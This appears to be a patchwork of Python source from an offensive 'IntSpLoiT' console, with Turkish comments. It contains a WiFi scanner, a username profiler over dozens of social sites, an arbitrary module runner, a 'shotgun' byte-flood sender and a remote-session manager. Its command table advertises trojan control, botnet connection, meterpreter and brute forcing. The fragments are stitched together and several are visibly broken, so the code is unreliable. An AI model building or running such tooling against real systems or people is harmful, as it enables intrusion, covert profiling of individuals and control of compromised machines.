		if targets == "set rhosts" or "set rhost":
			print("""you are used rhosts you are must use ("del lports") or ("del lport")  """)
import pywifi
from pywifi import *
from pywifi import PyWiFi, const, Profile
try:
	from scapy.all import sniff, Dot11, Dot11Beacon
except:
	pass
def is_root():
	return os.getuid() == 0
def scan_wifispy():
	if not is_root():
	   wifi = PyWiFi()
	   iface = wifi.interfaces()[0]  # Kullanmak istediğiniz WiFi arayüzünü seçin.
	   iface.scan()
	   iface.scan_results()
	   results = iface.scan_results()
	   for network in results:
	   	print(f"SSID: {network.ssid}, BSSID: {network.bssid}, Signal Level: {network.signal}")
	else:
		print("wifi not found")
		pass
	if is_root():
	       if packet.haslayer(Dot11Beacon):
	       	ssid = packet[Dot11].info.decode()
	       	bssid = packet[Dot11].addr3
	       	level = packet.dBm_AntSignal
	       	print(f"SSID: {ssid}, BSSID: {bssid}, Signal Level: {level}")
	else:
		print("wifi not found")
		pass


import os
import time
import shutil
import sys

def clear_screen():
    """
    Clears the terminal screen. Compatible with Windows and Unix-based systems.
    """
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text, width):
    """
    Centers the given text within the specified width.
    """
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * padding + text

def credits_scroll(file_path="credits.txt", delay=0.3, color_code="\033[2;32m"):
    """
    Displays the contents of a credits file as a movie-style scrolling credits animation in the terminal.

    Parameters:
    - file_path: Path to the credits file (default: "credits.txt")
    - delay: Delay in seconds between each scroll step
    - color_code: ANSI color code for the text (default: dim green)

    The function adapts to the terminal size automatically.
    """

    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"\033[1;31mError: The file '{file_path}' was not found.\033[0m")
        return
    except Exception as e:
        print(f"\033[1;31mFile read error: {e}\033[0m")
        return

    if not lines:
        print(f"\033[1;33mWarning: The file '{file_path}' is empty or contains no content.\033[0m")
        return

    terminal_size = shutil.get_terminal_size((80, 20))
    terminal_height, terminal_width = terminal_size.lines, terminal_size.columns

    padding_lines = terminal_height
    scroll_lines = [""] * padding_lines + lines + [""] * padding_lines

    try:
        for i in range(len(scroll_lines) - terminal_height + 1):
            clear_screen()
            window = scroll_lines[i:i + terminal_height]

            for line in window:
                print(f"{color_code}{center_text(line, terminal_width)}\033[0m")

            time.sleep(delay)

        clear_screen()
        thank_you_msg = "Thank you!"
        print(f"\033[1;36m{center_text(thank_you_msg, terminal_width)}\033[0m")
        time.sleep(2)
        clear_screen()

    except KeyboardInterrupt:
        clear_screen()
        print(f"\n\033[1;33mAnimation interrupted by user.\033[0m")
        sys.exit()

#!/usr/bin/env python3
import requests
import time
import argparse

def outer_func(colour):
    def inner_function(msg):
        print(f'{colour}{msg}')
    return inner_function

''' COLOUR PRINTS '''
GREEN = outer_func('\033[92m')
YELLOW = outer_func('\033[93m')
RED = outer_func('\033[91m')


def searchus(username):
    WEBSITES = [
        f'https://www.instagram.com/{username}', f'https://www.facebook.com/{username}', f'https://www.twitter.com/{username}',
        f'https://www.youtube.com/{username}', f'https://{username}.blogspot.com', f'https://plus.google.com/s/{username}/top',
        f'https://www.reddit.com/user/{username}', f'https://{username}.wordpress.com', f'https://www.pinterest.com/{username}',
        f'https://www.github.com/{username}', f'https://{username}.tumblr.com', f'https://www.flickr.com/people/{username}',
        f'https://steamcommunity.com/id/{username}', f'https://vimeo.com/{username}', f'https://soundcloud.com/{username}',
        f'https://disqus.com/by/{username}', f'https://medium.com/@{username}', f'https://{username}.deviantart.com',
        f'https://vk.com/{username}', f'https://about.me/{username}', f'https://imgur.com/user/{username}',
        f'https://flipboard.com/@{username}', f'https://slideshare.net/{username}', f'https://fotolog.com/{username}',
        f'https://open.spotify.com/user/{username}', f'https://www.mixcloud.com/{username}', f'https://www.scribd.com/{username}',
        f'https://www.badoo.com/en/{username}', f'https://www.patreon.com/{username}', f'https://bitbucket.org/{username}',
        f'https://www.dailymotion.com/{username}', f'https://www.etsy.com/shop/{username}', f'https://cash.me/{username}',
        f'https://www.behance.net/{username}', f'https://www.goodreads.com/{username}', f'https://www.instructables.com/member/{username}',
        f'https://keybase.io/{username}', f'https://kongregate.com/accounts/{username}', f'https://{username}.livejournal.com',
        f'https://angel.co/{username}', f'https://last.fm/user/{username}', f'https://dribbble.com/{username}',
        f'https://www.codecademy.com/{username}', f'https://en.gravatar.com/{username}', f'https://pastebin.com/u/{username}',
        f'https://foursquare.com/{username}', f'https://www.roblox.com/user.aspx?username={username}', f'https://www.gumroad.com/{username}',
        f'https://{username}.newgrounds.com', f'https://www.wattpad.com/user/{username}', f'https://www.canva.com/{username}',
        f'https://creativemarket.com/{username}', f'https://www.trakt.tv/users/{username}', f'https://500px.com/{username}',
        f'https://buzzfeed.com/{username}', f'https://tripadvisor.com/members/{username}', f'https://{username}.hubpages.com',
        f'https://{username}.contently.com', f'https://houzz.com/user/{username}', f'https://blip.fm/{username}',
        f'https://www.wikipedia.org/wiki/User:{username}', f'https://news.ycombinator.com/user?id={username}', f'https://www.reverbnation.com/{username}',
        f'https://www.designspiration.net/{username}', f'https://www.bandcamp.com/{username}', f'https://www.colourlovers.com/love/{username}',
        f'https://www.ifttt.com/p/{username}', f'https://www.ebay.com/usr/{username}', f'https://{username}.slack.com',
        f'https://www.okcupid.com/profile/{username}', f'https://www.trip.skyscanner.com/user/{username}', f'https://ello.co/{username}',
        f'https://tracky.com/user/~{username}', f'https://{username}.basecamphq.com/login', f'https://www.linkedin.com/in/{username}'
    ]

    GREEN(f'[+] Searching for username: {username}')
    time.sleep(0.5)
    print('.......')
    time.sleep(0.5)
    print('.......\n')
    time.sleep(0.5)

    GREEN(f'[+] intSpLoiT\'s UserSearch is working...\n')
    time.sleep(0.5)
    print('.......')
    time.sleep(0.5)
    print('.......\n')
    time.sleep(0.5)

    time.sleep(1)

    count = 0
    match = True
    for url in WEBSITES:
        r = requests.get(url)

        if r.status_code == 200:
            if match:
                GREEN('[+] FOUND MATCHES')
                match = False
            YELLOW(f'\n{url} - {r.status_code} - OK')
            if username in r.text:
                GREEN(f'POSITIVE MATCH: Username:{username} - text has been detected in url.')
            else:
                GREEN(f'POSITIVE MATCH: Username:{username} - \033[91mtext has NOT been detected in url, could be a FALSE POSITIVE.')
        count += 1

    total = len(WEBSITES)
    GREEN(f'FINISHED: A total of {count} MATCHES found out of {total} websites.')

def usersearch_handler(help_input):
    """
    Argparse kullanarak tamamen orijinal script mantığını korur.
    Örnek: "usersearch username=velgrath"
    """
    try:
        # shlex ile input stringini argv listesine çevir
        args_list = shlex.split(help_input)

        # argparse oluştur
        parser = argparse.ArgumentParser(description="Search for a username across multiple websites")
        parser.add_argument('username', type=str, help='Username to search for')

        # args_list'ın ilk elemanı komut ise onu ignore et
        if args_list[0].lower() == "usersearch":
            args_list = args_list[1:]

        args = parser.parse_args(args_list)

        bannerslk()
        searchus(args.username)

    except SystemExit:
        # argparse kendi sys.exit() çağrısını yapıyor, bunu handle etmek için
        print("Hata: Parametreler hatalı veya eksik. Örnek: usersearch username=velgrath")
    except Exception as e:
        print(f"Hata: {str(e)}")


from colorama import Fore, Style, init			
init()
def scan5115(interface):
    from wifi import Cell, Scheme
    import scapy.all as scapy
    try:
    	networks = Cell.all(interface)
    except FileNotFoundError:
    	print("iwlist not found")
    if os.getuid() == 0:
    	print("[intbase] device is not rooted!")
    print(f"{len(networks)} adet kablosuz ağ bulundu:")
    for network in networks:
        print(f"SSID: {network.ssid}")
        print(f"BSSID (MAC): {network.address}")
        print(f"Sinyal Gücü: {network.signal} dBm")
        print(f"Şifreleme: {network.encryption_type}\n")

global prompt_str

def use_module(command):
    global modules, modulename
    try:
        # Komutun doğru formatta olup olmadığını kontrol et
        if command.startswith("use intframework/") or command.startswith("use "):
            # `use ` kısmını çıkar ve modül yolunu al
            module_path = command.split(" ", 1)[1].replace("::", "/")
            modulename = os.path.basename(module_path)  # Dosya adını al
            modules = module_path  # Global değişken olarak belirle

            # Modül bilgilerini kullanıcıya göster
            prompt_str=get_input(modules=module_path, modulename=modulename)
            load_schema_from_module(modules)
            print(f"\n{Fore.YELLOW}[*] Loading module: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Module: {Fore.GREEN}{modulename}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Successfully loaded.{Style.RESET_ALL}\n")
        else:
            print(f"\n{Fore.RED}[-] Invalid command.{Style.RESET_ALL} Use '{Fore.CYAN}use intframework/path/to/module_name{Style.RESET_ALL}' or '{Fore.CYAN}use path/to/module_name{Style.RESET_ALL}'.\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}\n")

def check_if_argparse_used(module_path):
    """Argparse kullanımı kontrol eder"""
    try:
        with open(module_path, "r") as f:
            content = f.read()
            if 'argparse' in content:
                return True
        return False
    except Exception as e:
        print(f"Error reading the module file: {e}")
        return False
# Directories to search
dirs_int = ["intPRO", "modules", "PHİSHERS", "tools"]


import pathlib
from colorama import Fore, Style

def list_all_files(directories):
    """
    List all files in the specified directories
    - directories: Directories to search in.
    """
    file_paths = []

    for directory in directories:
        base_path = pathlib.Path(directory)

        if not base_path.exists():
            print(Fore.RED + f"[!] Directory not found: {directory}")
            continue

        for file in base_path.rglob('*'):  # Use rglob to search all files
            if file.is_file():
                file_paths.append(file)

    return file_paths

def search_in_file(file_path, filters, raw_term):
    """
    Search for a term in a file and return the matching lines based on filters
    - file_path: The file to search in.
    - filters: Dictionary with search parameters.
    - raw_term: The raw search term (if no filters are used).
    """
    matching_lines = []

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                line_lower = line.lower()

                # Eğer filtreler varsa filtrelere göre ara
                if filters:
                    if all(f"{key}:{value}" in line_lower for key, value in filters.items()):
                        matching_lines.append(line.strip())
                # Eğer filtre yoksa, sadece normal kelimeyi ara
                elif raw_term and raw_term.lower() in line_lower:
                    matching_lines.append(line.strip())
    except Exception as e:
        print(Fore.RED + f"[!] Error: Could not read the file {file_path}: {e}")

    return matching_lines

def display_files(file_paths):
    """
    Display the list of files found
    """
    if file_paths:
        print(Fore.GREEN + Style.BRIGHT + "[*] All Files:")
        for file in file_paths:
            print(Fore.CYAN + f"  [+] {str(file)}")
    else:
        print(Fore.RED + "[!] No files found.")

def search(command):
    """
    Process the search command using lib.search.

    - command: Search command as a string (e.g., "search exploit type:auxiliary author:Intframework")
    
    Returns:
        Search results processed by lib.search.
    """
    searcher = lib.search.ModuleSearch()
    searcher.process_command(command)

def display_search_results(results):
    """
    Display the search results
    """
    if results:
        print(Fore.GREEN + Style.BRIGHT + "\n[*] Search Results:")
        for file, lines in results.items():
            print(Fore.YELLOW + f"\n[+] {file}:")
            for line in lines:
                print(Fore.CYAN + f"    [*] {line}")
    else:
        print(Fore.RED + "[!] No matches found.")

def parse_search_term(search_term):
    """
    Parse the search term to extract filters like type, name, platform.
    - search_term: Raw input string (e.g., "type:exploit name:mysql platform:aix" or "apache")
    """
    filters = {}
    terms = search_term.split()
    raw_term = ""

    for term in terms:
        if ":" in term:
            key, value = term.split(":", 1)
            filters[key.lower()] = value.lower()
        else:
            raw_term += f"{term} "  # Normal kelimeleri topluyor

    return filters, raw_term.strip()

def us_search(search_term):
    """
    Perform a search using the given search term in the specified directories.
    - search_term: The term to search for.
    """
    # Parse filters and raw term
    filters, raw_term = parse_search_term(search_term)

    # List all files in the directories
    file_paths = list_all_files(dirs_int)

    # Display available files
    display_files(file_paths)

    # Perform the search with filters or raw term
    results = search(file_paths, filters, raw_term)

    # Display the search results
    display_search_results(results)



def detect_interpreter(module_path):
    """
    Detect the appropriate interpreter for a given file based on its extension, 
    shebang line, or defaults for Intikam21 Framework.
    """
    try:
        # 1. Dosya mevcut mu kontrol et
        if not os.path.isfile(module_path):
            print(f"{Fore.RED}[!] Module not found: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
            return None  # Dosya yoksa None döndür

        # 2. Dosya uzantısını kontrol et
        extension = os.path.splitext(module_path)[1].lower()
        interpreter_by_extension = {
            ".py2": "python2",   # Özel Python 2 uzantısı
            ".py": "python3",    # Varsayılan olarak Python 3
            ".c": "gcc",
            ".cpp": "g++",
            ".cs": "csharp",
            ".js": "node",
            ".rb": "ruby",
            ".php": "php",
            ".pl": "perl",
            ".sh": "bash",
            ".go": "go run",
            ".sql": "sqlcmd",
            ".html": "browser",
            ".lua": "lua",
            ".ps1": "powershell"  # PowerShell desteği
        }

        # Uzantıya göre yorumlayıcı belirle
        if extension in interpreter_by_extension:
            # Eğer uzantı ".py" ise, kullanıcı Python 2 için mi yoksa Python 3 için mi çalıştıracağını seçebilir.
            if extension == ".py":
                with open(module_path, 'r', buffering=1024) as file:
                    first_line = file.readline().strip()
                    if "python2" in first_line:  # Shebang Python 2 mi işaret ediyor?
                        return "python2"
                    else:
                        return "python3"  # Varsayılan olarak Python 3
            return interpreter_by_extension[extension]

        # 3. Eğer uzantı bilinmiyorsa, shebang satırını kontrol et
        with open(module_path, 'r', buffering=1024) as file:
            first_line = file.readline().strip()
            if first_line.startswith("#!"):
                if "python2" in first_line:
                    return "python2"
                elif "python" in first_line or "python3" in first_line:
                    return "python3"
                elif "ruby" in first_line:
                    return "ruby"
                elif "php" in first_line:
                    return "php"
                elif "perl" in first_line:
                    return "perl"
                elif "node" in first_line or "javascript" in first_line:
                    return "node"
                elif "gcc" in first_line or "clang" in first_line:
                    return "gcc"
                elif "g++" in first_line or "cpp" in first_line:
                    return "g++"
                elif "bash" in first_line or "sh" in first_line:
                    return "bash"
                elif "go" in first_line:
                    return "go run"
                elif "lua" in first_line:
                    return "lua"
                elif "powershell" in first_line or "pwsh" in first_line:
                    return "powershell"
                elif "csharp" in first_line or "dotnet" in first_line:
                    return "csharp"
                elif "sql" in first_line:
                    return "sqlcmd"
                elif "html" in first_line:
                    return "browser"
                else:
                	print(f"{Fore.YELLOW}[+] No valid interpreter found. Defaulting to python3 for module: {Fore.CYAN}{module_path}{Style.RESET_ALL}")
                	return "python3"
        # 4. Ne uzantı ne de shebang tespit edilemiyorsa, varsayılan olarak Python 3 döndür


    except Exception as e:
        print(f"{Fore.RED}[!] Error detecting interpreter for {Fore.CYAN}{module_path}{Style.RESET_ALL}: {e}{Style.RESET_ALL}")
        return "python3"  # Hata durumunda python3 döndür


import subprocess, shlex, os
from colorama import Fore, Style
import pexpect
import importlib.util
import subprocess
import pexpect
import os
import shlex
from datetime import datetime
def run_module(skar3792=None, payload=None, lhost=None, lport=None):
    global modules

    try:
        if not modules:
            print(f"{Fore.RED}[!] No module loaded. Use 'use intframework/path/to/module_name' to load one.{Style.RESET_ALL}")
            if dispatcher:
                dispatcher.dispatch("error_occurred", {
                    "source": "run_module",
                    "message": "No module loaded."
                })
            return

        print(f"{Fore.YELLOW}[*] Inspecting module: {Fore.CYAN}{modules}{Style.RESET_ALL}")
        interpreter = detect_interpreter(modules)
        if not interpreter:
            print(f"{Fore.RED}[!] Interpreter detection failed.{Style.RESET_ALL}")
            if dispatcher:
                dispatcher.dispatch("error_occurred", {
                    "source": "run_module",
                    "message": "Interpreter detection failed."
                })
            return
        print(f"{Fore.GREEN}[+] Interpreter: {interpreter}{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] Interpreter inspection error: {e}{Style.RESET_ALL}")
        if dispatcher:
            dispatcher.dispatch("error_occurred", {
                "source": "run_module",
                "message": str(e)
            })
        return

    try:
        print(f"{Fore.YELLOW}[*] Running module: {Fore.CYAN}{modules}{Style.RESET_ALL}")
        if dispatcher:
            dispatcher.dispatch("module_execution", {
                "module": modules,
                "status": "started"
            })

        # PYTHON MODÜLÜ
        if modules.endswith(".py"):
            try:
                load_schema_from_module(modules)
                load_context()
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Context loading skipped: {e}{Style.RESET_ALL}")

            try:
                args = []
                for key, value in module_context.items():
                    if value:
                        args.append(str(value))

                spec = importlib.util.spec_from_file_location("module", modules)
                mod = importlib.util.module_from_spec(spec)

                if spec.loader:
                    spec.loader.exec_module(mod)

                    for func_name in ("run", "main", "execute"):
                        if hasattr(mod, func_name):
                            func = getattr(mod, func_name)
                            if callable(func):
                                print(f"{Fore.YELLOW}[*] Running module function: {func_name}(){Style.RESET_ALL}")
                                try:
                                    try:
                                    	func(module_context)
                                    except:
                                    	func()
                                except Exception as ferror:
                                    print(f"{Fore.RED}[!] Error inside function: {ferror}{Style.RESET_ALL}")
                                    if dispatcher:
                                        dispatcher.dispatch("error_occurred", {
                                            "source": func_name,
                                            "message": str(ferror)
                                        })
                                    return
                                if dispatcher:
                                    dispatcher.dispatch("module_execution", {
                                        "module": modules,
                                        "status": "completed",
                                        "output": f"{func_name}() executed"
                                    })
                                return

                    print(f"{Fore.RED}[!] No entry function found (run/main/execute).{Style.RESET_ALL}")
                    if dispatcher:
                        dispatcher.dispatch("error_occurred", {
                            "source": "run_module",
                            "message": "No callable function found."
                        })

                else:
                    print(f"{Fore.RED}[!] Python module loader is None.{Style.RESET_ALL}")
                    if dispatcher:
                        dispatcher.dispatch("error_occurred", {
                            "source": "run_module",
                            "message": "Python loader is None"
                        })

            except Exception as ex:
                print(f"{Fore.RED}[!] Error loading Python module: {ex}{Style.RESET_ALL}")
                if dispatcher:
                    dispatcher.dispatch("error_occurred", {
                        "source": "run_module",
                        "message": str(ex)
                    })

        # PYTHON DIŞI MODÜLLER
        else:
            if not skar3792:
                skar3792 = ""

            try:
                command = [interpreter, modules] + (
                    shlex.split(skar3792) if isinstance(skar3792, str) else skar3792
                )

                # input() kullanılıyor mu kontrol et
                uses_input = False
                try:
                    with open(modules, 'r', encoding='utf-8') as f:
                        script_content = f.read()
                        uses_input = 'input(' in script_content
                except:
                    uses_input = False

                if uses_input:
                    cmd_str = ' '.join(shlex.quote(arg) for arg in command)
                    print(f"{Fore.YELLOW}[*] Module uses input(). Starting interactive session...{Style.RESET_ALL}")
                    try:
                        child = pexpect.spawn(cmd_str)
                        child.interact()
                        if dispatcher:
                            dispatcher.dispatch("module_execution", {
                                "module": modules,
                                "status": "completed",
                                "output": "[interactive execution completed]"
                            })
                    except Exception as ie:
                        print(f"{Fore.RED}[!] Error in interactive session: {ie}{Style.RESET_ALL}")
                        if dispatcher:
                            dispatcher.dispatch("error_occurred", {
                                "source": "run_module",
                                "message": str(ie)
                            })
                else:
                    result = subprocess.run(command, capture_output=True, text=True)
                    if result.returncode == 0:
                        print(f"{Fore.GREEN}[+] Module executed successfully.{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}{result.stdout.strip()}{Style.RESET_ALL}")
                        if dispatcher:
                            dispatcher.dispatch("module_execution", {
                                "module": modules,
                                "status": "completed",
                                "output": result.stdout.strip()
                            })
                    else:
                        print(f"{Fore.RED}[!] Module execution failed with code {result.returncode}.{Style.RESET_ALL}")
                        print(f"{Fore.RED}{result.stderr.strip()}{Style.RESET_ALL}")
                        if dispatcher:
                            dispatcher.dispatch("error_occurred", {
                                "source": "run_module",
                                "message": result.stderr.strip()
                            })

            except Exception as ex:
                print(f"{Fore.RED}[!] Error running non-python module: {ex}{Style.RESET_ALL}")
                if dispatcher:
                    dispatcher.dispatch("error_occurred", {
                        "source": "run_module",
                        "message": str(ex)
                    })

    except Exception as e:
        print(f"{Fore.RED}[!] Unhandled error: {e}{Style.RESET_ALL}")
        if dispatcher:
            dispatcher.dispatch("error_occurred", {
                "source": "run_module",
                "message": str(e)
            })


import socket
from colorama import Fore, Style, init

init(autoreset=True)

def make_red_bold(text):
    return f"{Style.BRIGHT}{Fore.RED}{text}{Style.RESET_ALL}"

def send_bytes_to_ip(target_ip, target_port, byte_size, timeout=3):
    """Belirtilen süre içinde belirtilen boyutta bir byte dizisi gönderir."""
    message = b"A" * byte_size  # Örnek byte dizisi
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((target_ip, target_port))
        sock.sendall(message)
        print(f"{byte_size} byte's message true {target_ip}:{target_port} adresses connected.")
    except socket.timeout:
        print(f"Hata: Bağlantı zaman aşımına uğradı ({timeout} saniye).")
    except Exception as e:
        print(f"Hata: Mesaj gönderilirken bir hata oluştu: {str(e)}")
    finally:
        sock.close()

def shotgun_handler(help_input):
    """
    help_input örnek formatı:
    shotgun lhost=127.0.0.1 lport=8080 bytes=1024
    """
    try:
        # Boşluklarla ayır
        parts = help_input.strip().split()
        if len(parts) < 4:
            print("Hata: Eksik parametreler. Örnek kullanım: shotgun lhost=IP lport=PORT bytes=SIZE")
            return

        # Default değerler
        target_ip = None
        target_port = None
        byte_size = None

        # Parametreleri ayrıştır
        for part in parts[1:]:  # ilk kısım 'shotgun'
            if part.startswith("lhost="):
                target_ip = part.split("=")[1]
            elif part.startswith("lport="):
                target_port = int(part.split("=")[1])
            elif part.startswith("bytes="):
                byte_size = int(part.split("=")[1])

        # Hata kontrolü
        if not target_ip or not target_port or not byte_size:
            print("Hata: Tüm parametreler gerekli! Örnek: shotgun lhost=127.0.0.1 lport=8080 bytes=1024")
            return

        # Byte gönder
        send_bytes_to_ip(target_ip, target_port, byte_size, timeout=3)
        print(make_red_bold("SHOTTED!"))

    except Exception as e:
        print(f"Hata: {str(e)}")

# Örnek kullanım framework içinde:
# help_input = "shotgun lhost=127.0.0.1 lport=8080 bytes=1024"
# shotgun_handler(help_input)

def handle_sessions(args, sm):
    args = args.split() if isinstance(args, str) else args

    if not args or "-l" in args or "--list" in args:
        sm.list_sessions()
        return

    if "-h" in args or "--help" in args:
        print("""
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

  -c, --command <command>         Run a command on session given with -i, or on all
  -h, --help                      Show this help menu
  -i, --interact <id>             Interact with session by ID
  -k, --kill <id>                 Terminate session by ID
  -K, --kill-all                  Terminate all sessions
  -l, --list                      List active sessions
  -n, --name <id> <name>          Rename a session by ID
  -S, --search <filter>           Search session IPs (e.g., 192.168.)
  -t, --timeout <seconds>         Set session response timeout
  -v, --list-verbose              Verbose list of sessions
  -x, --list-extended             Extended session information
""")
        return

    try:
        if "-i" in args or "--interact" in args:
            idx = args.index("-i") if "-i" in args else args.index("--interact")
            sid = int(args[idx + 1])
            sm.interact(sid)

        elif "-c" in args or "--command" in args:
            cidx = args.index("-c") if "-c" in args else args.index("--command")
            command = args[cidx + 1]
            if "-i" in args:
                iidx = args.index("-i")
                sid = int(args[iidx + 1])
                output = sm.send_command(sid, command)
                print(f"[Session {sid}] > {output}")
            else:
                for sid in sm.sessions.keys():
                    output = sm.send_command(sid, command)
                    print(f"[Session {sid}] > {output}")

        elif "-k" in args or "--kill" in args:
            idx = args.index("-k") if "-k" in args else args.index("--kill")
            sid = int(args[idx + 1])
            sm.kill_session(sid)
            print(f"[+] Session {sid} terminated.")

        elif "-K" in args or "--kill-all" in args:
            for sid in list(sm.sessions.keys()):
                sm.kill_session(sid)
            print("[+] All sessions terminated.")

        elif "-n" in args or "--name" in args:
            idx = args.index("-n") if "-n" in args else args.index("--name")
            sid = int(args[idx + 1])
            name = args[idx + 2]
            sm.rename_session(sid, name)
            print(f"[+] Session {sid} renamed to '{name}'.")

        elif "-S" in args or "--search" in args:
            idx = args.index("-S") if "-S" in args else args.index("--search")
            value = args[idx + 1]
            sm.search_sessions(value)

        elif "-t" in args or "--timeout" in args:
            idx = args.index("-t") if "-t" in args else args.index("--timeout")
            seconds = int(args[idx + 1])
            sm.set_timeout(seconds)
            print(f"[+] Timeout set to {seconds} seconds.")

        elif "-v" in args or "--list-verbose" in args:
            print("[*] Verbose session listing:")
            for sid, sess in sm.sessions.items():
                print(f"Session {sid} | Addr: {sess.addr} | Alive: {sess.alive}")

        elif "-x" in args or "--list-extended" in args:
            print("[*] Extended session info:")
            for sid, sess in sm.sessions.items():
                print(f"""
[Session #{sid}]
  IP       : {sess.addr[0]}
  Port     : {sess.addr[1]}
  Alive    : {'Yes' if sess.alive else 'No'}
  Commands : {list(sess.shell.dynamic_commands.keys())}
""")

        else:
            print("[!] Unknown option. Use 'sessions -h' for help.")

    except (IndexError, ValueError):
        print("[!] Invalid arguments. Use 'sessions -h' for correct syntax.")
        
def monitor_process(proc):
    """Çalışan modülü izler"""
    global running_pid
    while True:
        if proc.poll() is not None:  # Process bitti mi?
            print(f"Module {modules} has stopped.")
            return
        time.sleep(1)  # Her saniye kontrol et
from prompt_toolkit.lexers import Lexer
commands_with_desc = {
    "neofetch": ("Show system info", "\x1b[32m"),
    "com-help": ("Show command help", "\x1b[34m"),
    "intshark": ("Network sniffer tool", "\x1b[36m"),
    "oip": ("IP lookup", "\x1b[36m"),
    "introjan": ("Trojan control", "\x1b[31m"),
    "build": ("Build payloads or exploits", "\x1b[33m"),
    "use": ("Use module", "\x1b[32m"),
    "set": ("Set options", "\x1b[33m"),
    "show": ("Show options or info", "\x1b[36m"),
    "back": ("Go back", "\x1b[33m"),
    "search": ("Search modules or exploits", "\x1b[33m"),
    "show commands": ("List available commands", "\x1b[36m"),
    "connect": ("Connect to target", "\x1b[33m"),
    "exploit": ("Exploit target system", "\x1b[31m"),
    "bset": ("Batch set options", "\x1b[33m"),
    "banner": ("Show banner", "\x1b[36m"),
    "py-search": ("Search Python scripts", "\x1b[32m"),
    "payload-search": ("Search payloads", "\x1b[31m"),
    "exp-search": ("Search exploits", "\x1b[31m"),
    "exploit-search": ("Search exploits", "\x1b[31m"),
    "jobs": ("Show background jobs", "\x1b[33m"),
    "jobs -k": ("Kill background jobs", "\x1b[31m"),
    "dns": ("DNS lookup", "\x1b[36m"),
    "help": ("Show help menu", "\x1b[32m"),
    "use ": ("Use module (space required)", "\x1b[32m"),
    "intcrawler": ("intSpLoiT crawler tool", "\x1b[36m"),
    "searchuser": ("Search user info", "\x1b[33m"),
    "mailsearch": ("Email search", "\x1b[33m"),
    "phonesearch": ("Phone number search", "\x1b[33m"),
    "connectbot": ("Connect to botnet", "\x1b[31m"),
    "meterpreter": ("Meterpreter shell", "\x1b[31m"),
    "shotgun": ("Shotgun attack tool", "\x1b[31m"),
    "imei": ("IMEI info lookup", "\x1b[36m"),
    "run": ("Run command or script", "\x1b[32m"),
    "whoI": ("Whois lookup", "\x1b[36m"),
    "intattack": ("Launch intSpLoiT attack", "\x1b[31m"),
    "load_plugins": ("Load plugins", "\x1b[33m"),
    "list_plugins": ("List available plugins", "\x1b[33m"),
    "run_plugins": ("Run loaded plugins", "\x1b[32m"),
    "monitor": ("Monitor activities", "\x1b[36m"),
    "exploiter": ("Exploit tool", "\x1b[31m"),
    "modular": ("Modular mode", "\x1b[33m"),
    "wifi_scan": ("Scan WiFi networks", "\x1b[36m"),
    "network_scan": ("Scan networks", "\x1b[36m"),
    "wardriving": ("Wardriving mode", "\x1b[33m"),
    "hydra": ("Brute force tool", "\x1b[31m"),
    "dragon": ("Dragon tool", "\x1b[31m"),
    "tunnel": ("Create tunnel", "\x1b[33m"),
    "portfwd": ("Port forwarding", "\x1b[33m"),
    "route": ("Manage routing", "\x1b[33m"),
    "session": ("Manage sessions", "\x1b[33m"),
}

global modules
global modulename
global cdn

def get_input(modules=None, modulename=None, cdn=None, payloads=None):
    global promptin

    # Eğer dışarıdan parametre geçilmediyse varsayılanları kullan
    modules = modules if modules is not None else ""
    modulename = modulename if modulename is not None else ""
    cdn = cdn if cdn is not None else ""
    payloads = payloads if payloads is not None else ""

    get_meterpreter()

    if payloads:
        promptin = f"{Fore.BLUE}int4-pro{Fore.RESET} payloads({Fore.RED}{payloads}{Fore.RESET})> {Style.RESET_ALL}"
        return ANSI(f"\x1b[34mint4-pro\x1b[0m payloads(\x1b[31m{payloads}\x1b[0m)> ")
    if modules and modulename:
        promptin = f"{Fore.BLUE}int4-pro{Fore.RESET} {modulename}({Fore.RED}{modules}{Fore.RESET}) > {Style.RESET_ALL}"
        return ANSI(f"\x1b[34mint4-pro\x1b[0m {modulename}(\x1b[31m{modules}\x1b[0m)> ")
    if cdn:
        promptin = f"{Fore.BLUE}int4-pro{Fore.RESET} ({Fore.RED}{cdn}{Fore.RESET}) > {Style.RESET_ALL}"
        return ANSI(f"\x1b[34mint4-pro\x1b[0m (\x1b[31m{cdn}\x1b[0m)> ")
    promptin = f"{Fore.BLUE}{Style.BRIGHT}int4-pro{Style.RESET_ALL} >"
    return ANSI(f"\x1b[1;34mint4-pro\x1b[0m > ")
    
try:
	import db.auto as auto
	from db.auto import ModuleManager
	mmg = ModuleManager()
	mmg.scan_modules()
	os.system("mv modules.json db/modules.json")
except:
	pass
	
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
IntSpLoiT Framework Full Help Module
Author: Velgrath 🔱
Description: Comprehensive help system for all IntSpLoiT commands.
"""

def show_help(command=None):
    help_data = {
        # -------------------- GENERAL COMMANDS --------------------
        "help": {
            "description": "Show the general help menu or detailed help for a specific command.",
            "usage": "help or help <command>",
            "example": "help wifi_scan",
            "how_to": "1. Type 'help' to see a list of all available commands.\n"
                      "2. Type 'help <command>' to get detailed usage information."
        },
        "exit": {
            "description": "Exit the framework console safely.",
            "usage": "exit",
            "example": "exit",
            "how_to": "Simply type 'exit' or 'quit' to leave the console."
        },
        "banner": {
            "description": "Display or customize the framework banner.",
            "usage": "banner",
            "example": "banner",
            "how_to": "1. Type 'banner' to show current banner.\n"
                      "2. Use options to customize colors or text."
        },
        "credits": {
            "description": "Show the credits for the framework.",
            "usage": "credits",
            "example": "credits",
            "how_to": "1. Type 'credits' to see all contributors and team info."
        },
        "clear": {
            "description": "Clear the console screen.",
            "usage": "clear",
            "example": "clear",
            "how_to": "1. Type 'clear' to remove all previous outputs from view."
        },
        "use": {
            "description": "Select a specific module to use.",
            "usage": "use <module_name>",
